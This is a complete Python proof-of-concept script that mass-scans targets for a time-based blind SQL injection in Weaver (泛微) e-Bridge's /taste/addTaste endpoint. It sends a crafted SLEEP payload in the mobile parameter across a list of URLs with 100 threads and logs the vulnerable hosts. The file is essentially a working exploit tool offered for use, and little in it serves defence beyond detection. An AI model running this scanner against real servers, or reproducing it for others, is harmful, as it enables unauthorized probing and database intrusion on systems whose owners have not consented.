import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅                                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="泛微云桥e-Bridge存在SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(print(f"Usag:\n\t python3 {sys.argv[0]} -h"))
    
def poc(target):
    payload_url = '/taste/addTaste?company=1&userName=1&openid=1&source=1&mobile=1%27%20AND%20(SELECT%208094%20FROM%20(SELECT(SLEEP(5-(IF(18015%3e3469,0,4)))))mKjk)%20OR%20%27KQZm%27=%27REcX'   
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Upgrade-Insecure-Requests':'1',
        'Te':'trailers',
        'Connection':'close'
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if "添加体验账号程序异常，请联系管理员" in res:
            print(f"[+]该url:{target}存在SQL注入漏洞")
            with open('result.txt','w',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在SQL注入漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在SQL注入漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()